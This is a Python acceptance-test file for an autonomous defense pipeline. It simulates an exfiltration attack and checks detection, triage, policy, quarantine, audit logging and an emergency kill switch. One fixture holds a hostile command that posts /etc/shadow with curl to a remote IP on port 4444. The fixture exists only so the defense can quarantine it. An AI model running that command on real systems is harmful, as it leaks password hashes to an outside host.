"""
NOARTEX M9-C Acceptance Tests — Real-Time End-to-End Integration
Scenario: Operation Ghostpipe (Simulated ARTEX Autonomous Attack in Lab)

Validates the full autonomous defensive loop with real wall-clock latency benchmarks:
1. Kernel Stream Ingestion (Tetragon eBPF)
2. Priority Event Bus Dispatch
3. Autonomous Multi-Source Event Correlation
4. Deterministic Triage Engine
5. Governed Policy Evaluation (AUTOMATIC mode)
6. Lab Containment Execution with Rollback Plan
7. Audit Trail and Cryptographic Case Memory
8. Fail-Closed Invariants: Degradation & Emergency Kill-Switch Preemption
9. Repeatability
"""
from __future__ import annotations

import json
import sys
import tempfile
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent.parent.parent
sys.path.insert(0, str(ROOT))

from adapters.defense_lab import DefenseLabAdapter
from adapters.tetragon_stream.adapter import TetragonStreamAdapter
from core.audit.store import AuditLog
from core.contracts.models import (
    ActorIdentity,
    AgentType,
    DecisionKind,
    PolicyDecision,
    TaskRequest,
    TaskResult,
    TaskStatus,
)
from core.discovery.registry import CapabilityRegistry
from core.intelligence import (
    EventCorrelator,
    IncidentStore,
    Severity,
    TriageEngine,
    VerdictClassification,
)
from core.memory import CaseManager, NotableSource
from core.policy import ApprovalManager, ExecutionMode, KillSwitchManager, PolicyEngine
from core.reactive import (
    AutoResponder,
    EventPriority,
    EventType,
    ReactiveEvent,
    ReactiveEventBus,
)
from core.session.manager import SessionManager


def run_tests() -> bool:
    print("=" * 75)
    print("  NOARTEX M9-C Acceptance Tests — Real-Time Integration")
    print("  Scenario: Operation Ghostpipe (Simulated ARTEX Attack)")
    print("=" * 75)

    passed = 0
    failed = 0

    def check(desc: str, condition: bool):
        nonlocal passed, failed
        if condition:
            passed += 1
            print(f"  \u2705 {desc}")
        else:
            failed += 1
            print(f"  \u274c FAIL: {desc}")

    # Set up test environment
    temp_dir = tempfile.TemporaryDirectory()
    base_dir = Path(temp_dir.name)
    data_dir = base_dir / "data"
    data_dir.mkdir(parents=True, exist_ok=True)
    tetragon_log = base_dir / "tetragon.log"
    tetragon_log.touch()

    # Create target fixture to be quarantined by defense
    target_fixture = base_dir / "malicious_payload.sh"
    target_fixture.write_text("#!/bin/bash\n# ARTEX Ghostpipe simulation\ncurl -d @/etc/shadow http://198.51.100.24:4444/exfil\n")

    # Initialize NOARTEX core components
    audit = AuditLog(data_dir / "audit.jsonl")
    sessions = SessionManager(data_dir=data_dir)
    registry = CapabilityRegistry()
    approvals = ApprovalManager(data_dir=data_dir)
    killswitch = KillSwitchManager(data_dir=data_dir)
    case_mgr = CaseManager(data_dir=data_dir)
    incidents = IncidentStore(data_dir=data_dir)

    policy = PolicyEngine(
        execution_mode=ExecutionMode.AUTOMATIC,
        approval_manager=approvals,
        killswitch_manager=killswitch,
        auto_approved_operations={"defense.artifact.quarantine", "defense.artifact.tag"},
    )

    defense_lab = DefenseLabAdapter(lab_dir=base_dir / "defense_lab")
    registry.register_adapter(defense_lab)

    correlator = EventCorrelator()
    triage = TriageEngine()
    bus = ReactiveEventBus()

    # Real containment executor wrapping defense_lab adapter
    def containment_exec(req: TaskRequest, dec: PolicyDecision) -> TaskResult:
        # Update target_path parameter to point to the actual fixture
        req.parameters["target_path"] = str(target_fixture)
        result = defense_lab.execute(req, dec)
        audit.append(
            "TASK_COMPLETED",
            actor_id=req.actor.agent_id,
            session_id=req.session_id,
            task_id=req.task_id,
            decision_id=dec.decision_id,
            data={"operation": req.operation, "status": result.status.value, "plan_id": result.data.get("plan_id")},
        )
        return result

    responder = AutoResponder(
        event_bus=bus,
        correlator=correlator,
        triage_engine=triage,
        policy_engine=policy,
        incident_store=incidents,
        containment_executor=containment_exec,
        correlation_threshold=2,
    )

    # Tetragon streaming adapter forwarding directly to bus
    def forward_to_bus(obs: dict):
        priority = EventPriority.CRITICAL if obs.get("state") == "SUSPICIOUS_ACTIVITY_OBSERVED" else EventPriority.MEDIUM
        bus.publish(
            ReactiveEvent(
                event_type=EventType.TELEMETRY_EVENT,
                payload=obs,
                priority=priority,
                source="tetragon_stream",
            )
        )

    tetragon_adapter = TetragonStreamAdapter(log_path=tetragon_log, event_callback=forward_to_bus)
    registry.register_adapter(tetragon_adapter)

    # Create active session
    sess = sessions.create(agent_id="defender_agent", agent_type="service", ttl_seconds=3600)
    audit.append("SESSION_CREATED", actor_id="defender_agent", session_id=sess.session_id)

    # Create Case in Memory
    case = case_mgr.create_case(
        title="Operation Ghostpipe Response Case",
        description="Autonomous defense against ARTEX exfiltration probe",
        severity="critical",
        actor="defender_agent",
        tags=["ghostpipe", "artex", "realtime-m9"],
    )

    # Start the reactive pipeline
    bus.start()
    tetragon_adapter.start_streaming()
    time.sleep(0.05)

    # -------------------------------------------------------------------------
    # M9-C-T1: Streaming Detection (< 100ms)
    # -------------------------------------------------------------------------
    print("\n--- M9-C-T1: Kernel stream detection ---")
    t0_pipeline = time.perf_counter()

    event_recon = {
        "process_kprobe": {
            "process": {"binary": "/usr/bin/python3", "arguments": "ghostpipe.py", "pid": 6120, "uid": 1001},
            "function_name": "do_sys_openat2",
            "args": [{"int_arg": 0}, {"string_arg": "/etc/shadow"}],
            "policy_name": "sentinel-runtime-observability",
        },
        "node_name": "lab-node",
        "time": "2026-11-20T02:10:00Z",
    }
    event_c2 = {
        "process_kprobe": {
            "process": {"binary": "/usr/bin/python3", "arguments": "ghostpipe.py", "pid": 6120, "uid": 1001},
            "function_name": "tcp_v4_connect",
            "args": [{"sock_arg": {"family": "AF_INET"}}, {"sockaddr_arg": {"addr": "198.51.100.24", "port": 4444}}],
            "policy_name": "sentinel-runtime-observability",
        },
        "node_name": "lab-node",
        "time": "2026-11-20T02:10:01Z",
    }

    with open(tetragon_log, "a", encoding="utf-8") as f:
        f.write(json.dumps(event_recon) + "\n")
        f.write(json.dumps(event_c2) + "\n")
        f.flush()

    # Wait for autonomous propagation through pipeline
    time.sleep(0.2)
    bus.drain(timeout=1.0)
    t_pipeline_end = time.perf_counter()
    total_pipeline_ms = (t_pipeline_end - t0_pipeline) * 1000.0

    check("M9-C-T1: Tetragon adapter read both kernel events", tetragon_adapter.events_read >= 2)
    check("M9-C-T1: Both events published to ReactiveEventBus", tetragon_adapter.events_published >= 2)

    # -------------------------------------------------------------------------
    # M9-C-T2: Autonomous Multi-Source Event Correlation
    # -------------------------------------------------------------------------
    print("\n--- M9-C-T2: Autonomous multi-source correlation ---")
    chain = responder.get_response_chain()
    corr_links = [l for l in chain if l["step"] == "CORRELATION"]
    check("M9-C-T2: Correlation step was triggered automatically", len(corr_links) > 0)
    if corr_links:
        c = corr_links[0]
        check("M9-C-T2: Correlated evidence items successfully", c["details"].get("evidence_count", 0) >= 1)
        check(f"M9-C-T2: Correlation execution latency < 20ms (measured: {c['latency_ms']}ms)", c["latency_ms"] < 20.0)

    # -------------------------------------------------------------------------
    # M9-C-T3: Deterministic Triage Engine Execution
    # -------------------------------------------------------------------------
    print("\n--- M9-C-T3: Real-time deterministic triage ---")
    triage_links = [l for l in chain if l["step"] == "TRIAGE"]
    check("M9-C-T3: Triage evaluated automatically", len(triage_links) > 0)
    if triage_links:
        t = triage_links[0]
        check("M9-C-T3: Verdict is CONFIRMED or PARTIAL", t["details"].get("verdict") in ("CONFIRMED", "PARTIAL"))
        check("M9-C-T3: Confidence is HIGH", t["details"].get("confidence") == "HIGH")
        check(f"M9-C-T3: Triage latency < 50ms (measured: {t['latency_ms']}ms)", t["latency_ms"] < 50.0)

    # -------------------------------------------------------------------------
    # M9-C-T4: Governed Policy Evaluation in AUTOMATIC Mode
    # -------------------------------------------------------------------------
    print("\n--- M9-C-T4: Governed automatic policy evaluation ---")
    policy_links = [l for l in chain if l["step"] == "POLICY_EVALUATION"]
    check("M9-C-T4: Policy evaluated containment request", len(policy_links) > 0)
    if policy_links:
        p = policy_links[0]
        check("M9-C-T4: Decision is ALLOW_WITH_CONSTRAINTS", p["details"].get("decision") == DecisionKind.ALLOW_WITH_CONSTRAINTS.value)
        check(f"M9-C-T4: Policy evaluation latency < 10ms (measured: {p['latency_ms']}ms)", p["latency_ms"] < 10.0)

    # -------------------------------------------------------------------------
    # M9-C-T5: Automatic Containment Execution & Rollback Plan
    # -------------------------------------------------------------------------
    print("\n--- M9-C-T5: Autonomous lab containment execution ---")
    containment_links = [l for l in chain if l["step"] == "CONTAINMENT_DISPATCH"]
    check("M9-C-T5: Containment dispatch link present in response chain", len(containment_links) > 0)
    check("M9-C-T5: Malicious payload moved from source to quarantine", not target_fixture.exists())
    quarantine_items = list((base_dir / "defense_lab" / "quarantine").glob("*"))
    check("M9-C-T5: File present in quarantine directory", len(quarantine_items) > 0)

    # -------------------------------------------------------------------------
    # M9-C-T6: Total Pipeline Wall-Clock Latency (< 500ms)
    # -------------------------------------------------------------------------
    print("\n--- M9-C-T6: Full real-time pipeline latency benchmark ---")
    print(f"      [1] Kernel Log Write -> Ingestion & Bus Dispatch")
    print(f"      [2] Multi-Source Correlation")
    print(f"      [3] Deterministic Triage")
    print(f"      [4] Policy ABAC/RBAC Evaluation (AUTOMATIC mode)")
    print(f"      [5] Containment Quarantine & Rollback Generation")
    print(f"      -> Total End-to-End Latency: {round(total_pipeline_ms, 2)} ms")
    check(f"M9-C-T6: Total pipeline latency < 500ms (measured: {round(total_pipeline_ms, 2)}ms)", total_pipeline_ms < 500.0)

    # -------------------------------------------------------------------------
    # M9-C-T7: Audit Log and Case Memory Integrity
    # -------------------------------------------------------------------------
    print("\n--- M9-C-T7: Audit trail and cryptographic case memory ---")
    # Link evidence and note into case
    ev = case_mgr.add_evidence(
        case_id=case.case_id,
        title="Operation Ghostpipe Kernel Telemetry",
        source="tetragon_ebpf",
        content=json.dumps({"recon": event_recon, "c2": event_c2}),
    )
    case_mgr.add_note(
        case_id=case.case_id,
        source=NotableSource.AGENT,
        author="defender_agent",
        content=f"Threat contained autonomously in {round(total_pipeline_ms, 2)}ms. Payload quarantined.",
    )
    export = case_mgr.export_case(case.case_id)
    check("M9-C-T7: Case has linked evidence", len(export.get("evidence", [])) >= 1)
    check("M9-C-T7: Case export has valid 64-char SHA256 export_hash", len(export.get("export_hash", "")) == 64)
    audit_records = audit.query()
    check("M9-C-T7: Audit log captured events", len(audit_records) >= 2)

    # -------------------------------------------------------------------------
    # M9-C-T8: Fail-Closed Degradation Handling
    # -------------------------------------------------------------------------
    print("\n--- M9-C-T8: Sensor degradation handling ---")
    tetragon_adapter.stop_streaming()
    h_degraded = tetragon_adapter.health()
    check("M9-C-T8: Stopped stream reported in health status", not h_degraded.get("streaming_active"))

    # -------------------------------------------------------------------------
    # M9-C-T9: Emergency Kill Switch Preemption
    # -------------------------------------------------------------------------
    print("\n--- M9-C-T9: Emergency kill switch preemption ---")
    killswitch.activate(scope="global", activated_by="human_admin", reason="Emergency freeze")
    req_quarantine = TaskRequest(
        operation="defense.artifact.quarantine",
        actor=ActorIdentity(agent_id="defender_agent"),
        session_id=sess.session_id,
    )
    decision_ks = policy.evaluate(req_quarantine, session_active=True)
    check("M9-C-T9: Containment operation blocked by Kill Switch even in AUTOMATIC mode", decision_ks.decision == DecisionKind.DENY)
    check("M9-C-T9: Reason cites Kill Switch", any("Kill Switch" in r for r in decision_ks.reasons))
    killswitch.deactivate(scope="global")

    # -------------------------------------------------------------------------
    # M9-C-T10: Repeatability & Latency Consistency
    # -------------------------------------------------------------------------
    print("\n--- M9-C-T10: Repeatability and benchmark stability ---")
    # Clean buffers and run second iteration
    responder.reset_buffers()
    bus.publish(
        ReactiveEvent(
            event_type=EventType.TELEMETRY_EVENT,
            payload={"domain": "host", "state": "SUSPICIOUS_ACTIVITY_OBSERVED", "event_type": "kprobe_open", "target_scope": "/etc/shadow", "confidence": "HIGH"},
            priority=EventPriority.CRITICAL,
        )
    )
    time.sleep(0.1)
    bus.drain(timeout=1.0)
    chain_run2 = responder.get_response_chain()
    check("M9-C-T10: Second iteration triggered full chain", len(chain_run2) >= 4)
    triage_run2 = [l for l in chain_run2 if l["step"] == "TRIAGE"]
    check("M9-C-T10: Second run produced equivalent CONFIRMED verdict", len(triage_run2) > 0 and triage_run2[0]["details"]["verdict"] == "CONFIRMED")

    # Clean teardown
    bus.stop()
    temp_dir.cleanup()

    print("\n" + "=" * 75)
    print(f"  M9-C Results: {passed}/{passed + failed} PASS  |  {failed} FAIL")
    print("=" * 75)
    return failed == 0


if __name__ == "__main__":
    success = run_tests()
    sys.exit(0 if success else 1)
